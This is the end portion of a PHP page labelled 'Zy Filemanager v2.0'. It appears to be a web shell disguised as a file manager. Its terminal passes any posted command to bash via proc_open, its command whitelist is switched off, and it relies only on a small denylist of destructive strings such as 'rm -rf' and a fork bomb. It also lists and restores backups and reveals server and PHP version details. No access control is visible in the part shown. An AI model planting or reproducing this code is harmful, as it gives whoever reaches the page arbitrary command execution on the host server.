            <button type="button" onclick="insertCommand('free -m')" class="action-btn">free -m</button>
            <button type="button" onclick="clearTerminal()" class="action-btn" style="color:#ff4444;">Clear</button>
        </div>
    </form>
    
    <?php
    if (isset($_POST['cmd'])):
        $cmd = trim($_POST['cmd']);
        if ($cmd !== ''):
    ?>
    <div class="terminal-output" id="terminalOutput">
        <div style="color: #00ccff;">$ <?php echo htmlspecialchars($cmd); ?></div>
        <div style="margin-top: 10px;">
            <?php
            // Terminal execution with enhanced security
            $TERMINAL_TIMEOUT = 15;
            $TERMINAL_MAX_OUTPUT = 2 * 1024 * 1024;
            $USE_WHITELIST = false;
            $WHITELIST = ['ls','pwd','whoami','cat','id','uname','df','du','ps','top','zip','unzip','curl','wget','sed','grep','awk','tail','head','free','uptime','date'];
            
            if ($USE_WHITELIST) {
                $parts = preg_split('/\s+/', $cmd);
                if (!in_array($parts[0], $WHITELIST)) {
                    echo "<span style='color:#ff4444;'>Command not allowed by whitelist.</span>";
                    return;
                }
            }
            
            // Dangerous commands filter
            $dangerous = ['rm -rf', 'mkfs', 'dd', ':(){ :|:& };:', 'chmod 777', '> /dev/sda'];
            foreach ($dangerous as $danger) {
                if (strpos($cmd, $danger) !== false) {
                    echo "<span style='color:#ff4444;'>Dangerous command detected and blocked.</span>";
                    return;
                }
            }
            
            $shell = '/bin/bash';
            if (!is_executable($shell)) $shell = '/bin/sh';
            
            $safe_cd = 'cd ' . escapeshellarg($path) . ' 2>/dev/null && ';
            $run_cmd = $safe_cd . escapeshellcmd($shell) . ' -lc ' . escapeshellarg($cmd) . ' 2>&1';
            
            $descriptors = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            
            $process = @proc_open($run_cmd, $descriptors, $pipes, null, null);
            
            if (!is_resource($process)) {
                echo "<span style='color:#ff4444;'>Failed to open process. Ensure exec/proc_open is allowed.</span>";
            } else {
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                fclose($pipes[0]);
                
                $output = '';
                $start = time();
                $timed_out = false;
                
                while (true) {
                    $read = [$pipes[1], $pipes[2]];
                    $write = null;
                    $except = null;
                    
                    $num = stream_select($read, $write, $except, 1, 0);
                    
                    if ($num !== false && $num > 0) {
                        foreach ($read as $r) {
                            $chunk = stream_get_contents($r);
                            if ($chunk !== false && $chunk !== '') {
                                $output .= $chunk;
                                if (strlen($output) > $TERMINAL_MAX_OUTPUT) {
                                    $output = substr($output, 0, $TERMINAL_MAX_OUTPUT) . "\n\n[Output truncated (too large)]";
                                    break 2;
                                }
                            }
                        }
                    }
                    
                    $status = proc_get_status($process);
                    if (!$status['running']) {
                        $output .= stream_get_contents($pipes[1]);
                        $output .= stream_get_contents($pipes[2]);
                        break;
                    }
                    
                    if ((time() - $start) > $TERMINAL_TIMEOUT) {
                        $timed_out = true;
                        proc_terminate($process, 9);
                        $output .= "\n\n[Command terminated due to timeout after {$TERMINAL_TIMEOUT} seconds]";
                        break;
                    }
                    
                    usleep(100000);
                }
                
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($process);
                
                if ($output === '') {
                    $output = "[No output]";
                }
                
                // Highlight output
                $output = htmlspecialchars($output);
                $output = preg_replace('/\b(error|fail|failed|denied|permission)\b/i', '<span style="color:#ff4444;">$0</span>', $output);
                $output = preg_replace('/\b(success|ok|done|completed)\b/i', '<span style="color:#00ff88;">$0</span>', $output);
                $output = preg_replace('/\b(warning|notice)\b/i', '<span style="color:#ffff00;">$0</span>', $output);
                
                echo nl2br($output);
            }
            ?>
        </div>
    </div>
    <?php
        endif;
    endif;
    ?>
</div>

<!-- Backup Restore Section (Hidden by default) -->
<details style="margin-top: 20px; background: #1a1a1a; border-radius: 8px; padding: 15px;">
    <summary style="color: #00ccff; font-weight: bold; cursor: pointer;">
        🔧 Advanced Tools (Backup & Restore)
    </summary>
    <div style="margin-top: 15px;">
        <h4>Backup Management</h4>
        <p style="color: #888; margin-bottom: 10px;">
            Backup files are automatically created when editing files. They have .backup_YYYYMMDD_HHMMSS extension.
        </p>
        
        <?php
        // List backup files
        $backup_files = [];
        if ($handle = opendir($path)) {
            while (false !== ($entry = readdir($handle))) {
                if (preg_match('/\.backup_\d{8}_\d{6}$/', $entry)) {
                    $backup_files[] = $entry;
                }
            }
            closedir($handle);
        }
        
        if (!empty($backup_files)):
            sort($backup_files);
        ?>
        <table style="margin-top: 10px; font-size: 12px;">
            <tr>
                <th>Backup File</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($backup_files as $backup): ?>
            <tr>
                <td><?php echo htmlspecialchars($backup); ?></td>
                <td><?php echo formatSize(filesize($path . '/' . $backup)); ?></td>
                <td><?php echo date('Y-m-d H:i', filemtime($path . '/' . $backup)); ?></td>
                <td>
                    <a href="?path=<?php echo urlencode($path); ?>&restore=<?php echo urlencode($backup); ?>" 
                       onclick="return confirm('Restore from this backup?')"
                       class="action-btn">Restore</a>
                    <a href="?path=<?php echo urlencode($path); ?>&delete_backup=<?php echo urlencode($backup); ?>" 
                       onclick="return confirm('Delete this backup?')"
                       class="action-btn delete-btn">Delete</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
        <?php else: ?>
        <p style="color: #888; text-align: center;">No backup files found</p>
        <?php endif; ?>
    </div>
</details>

<!-- Footer -->
<div style="margin-top: 30px; padding: 20px; text-align: center; color: #888; border-top: 1px solid #333;">
    <p>Zy Filemanager v2.0 | Enhanced with Anti-500, Anti-Blank, Anti-Error Protection</p>
    <p style="font-size: 12px; margin-top: 5px;">
        PHP Version: <?php echo phpversion(); ?> | 
        Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?> | 
        Memory: <?php echo formatSize(memory_get_usage(true)); ?>
    </p>
</div>

<script>
// JavaScript for enhanced functionality

// Theme toggle
const themeBtn = document.getElementById('toggleTheme');
const body = document.body;

if (localStorage.getItem('theme') === 'light') {
    body.classList.add('light');
    themeBtn.textContent = '☀️ Light Mode';
}

themeBtn.addEventListener('click', () => {
    body.classList.toggle('light');
    if (body.classList.contains('light')) {
        localStorage.setItem('theme', 'light');
        themeBtn.textContent = '☀️ Light Mode';
    } else {
        localStorage.setItem('theme', 'dark');
        themeBtn.textContent = '🌙 Dark Mode';
    }
});

// Loading overlay
function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
    return true;
}

function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
}

// Auto-hide loading after 5 seconds (safety)
setTimeout(hideLoading, 5000);

// Confirmation for delete
function confirmDelete(filename) {
    return confirm(`Are you sure you want to delete "${filename}"?\n\nThis action cannot be undone!`);
}

// Validate rename
function validateRename(form) {
    const newName = form.rename_to.value.trim();
    if (!newName) {
        alert('New name cannot be empty!');
        return false;
    }
    if (/[\/\\:*?"<>|]/.test(newName)) {
        alert('Invalid characters in filename!');
        return false;
    }
    return confirm(`Rename to "${newName}"?`);
}

// Validate file save
function validateFileSave(form) {
    const content = form.content.value;
    if (content.length > 10485760) { // 10MB limit
        if (!confirm('File is very large (' + Math.round(content.length / 1024 / 1024) + 'MB). Save anyway?')) {
            return false;
        }
    }
    showLoading();
    return true;
}

// Terminal functions
function insertCommand(cmd) {
    document.getElementById('cmdInput').value = cmd;
    document.getElementById('cmdInput').focus();
}

function clearTerminal() {
    if (confirm('Clear terminal output?')) {
        const output = document.getElementById('terminalOutput');
        if (output) output.innerHTML = '';
    }
}

// Auto-scroll terminal to bottom
function scrollTerminalToBottom() {
    const output = document.getElementById('terminalOutput');
    if (output) {
        output.scrollTop = output.scrollHeight;
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Scroll terminal to bottom
    setTimeout(scrollTerminalToBottom, 100);
    
    // Auto-hide messages after 5 seconds
    setTimeout(() => {
        const messages = document.querySelectorAll('.error-message, .success-message');
        messages.forEach(msg => {
            msg.style.transition = 'opacity 0.5s';
            msg.style.opacity = '0';
            setTimeout(() => msg.remove(), 500);
        });
    }, 5000);
    
    // Prevent accidental navigation
    window.addEventListener('beforeunload', function(e) {
        const textarea = document.getElementById('fileContent');
        if (textarea && textarea.value !== textarea.defaultValue) {
            e.preventDefault();
            e.returnValue = 'You have unsaved changes. Are you sure you want to leave?';
        }
    });
});

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl+S to save in editor
    if ((e.ctrlKey || e.metaKey) && e.key === 's' && document.getElementById('editForm')) {
        e.preventDefault();
        document.getElementById('editForm').submit();
    }
    
    // Ctrl+F to focus search
    if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
        e.preventDefault();
        const cmdInput = document.getElementById('cmdInput');
        if (cmdInput) cmdInput.focus();
    }
    
    // Escape to clear terminal
    if (e.key === 'Escape') {
        clearTerminal();
    }
});

// File drop zone enhancement
document.addEventListener('dragover', function(e) {
    e.preventDefault();
    if (e.target.tagName === 'INPUT' && e.target.type === 'file') {
        e.target.style.borderColor = '#00ccff';
        e.target.style.boxShadow = '0 0 10px rgba(0, 204, 255, 0.5)';
    }
});

document.addEventListener('dragleave', function(e) {
    if (e.target.tagName === 'INPUT' && e.target.type === 'file') {
        e.target.style.borderColor = '';
        e.target.style.boxShadow = '';
    }
});

// Network status monitor
window.addEventListener('online', function() {
    showMessage('Connection restored', 'success');
});

window.addEventListener('offline', function() {
    showMessage('Connection lost - working offline', 'error');
});

function showMessage(text, type) {
    const msg = document.createElement('div');
    msg.className = type === 'success' ? 'success-message' : 'error-message';
    msg.textContent = text;
    document.body.insertBefore(msg, document.body.firstChild);
    setTimeout(() => msg.remove(), 3000);
}
</script>

</body>
</html>